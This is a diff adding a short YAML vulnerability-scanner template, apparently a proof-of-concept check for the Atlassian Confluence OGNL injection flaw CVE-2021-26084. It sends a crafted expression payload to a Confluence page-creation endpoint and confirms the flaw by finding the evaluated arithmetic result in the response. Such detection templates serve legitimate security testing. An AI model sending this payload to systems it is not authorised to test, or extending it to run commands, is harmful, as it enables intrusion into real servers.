@@ -1,0 +1,17 @@
+name: poc-yaml-atlassian-confluence-rce
+set:
+  rand1: randomInt(1000, 9999)
+  rand2: randomInt(400, 9999)
+rules:
+  - method: POST
+    path: "/pages/createpage-entervariables.action"
+    follow_redirects: true
+    body: |
+      queryString=alt3kx\u0027%2b#{{{rand1}}*{{rand2}}}%2b\u0027
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(rand1 * rand2)))
+detail:
+  author: tangshoupu
+  info: Atlassian Confluence远程代码执行漏洞(CVE-2021-26084)
+  links:
+    - https://mp.weixin.qq.com/s/lVCT6JAA_BU9h4ISLlMNbQ
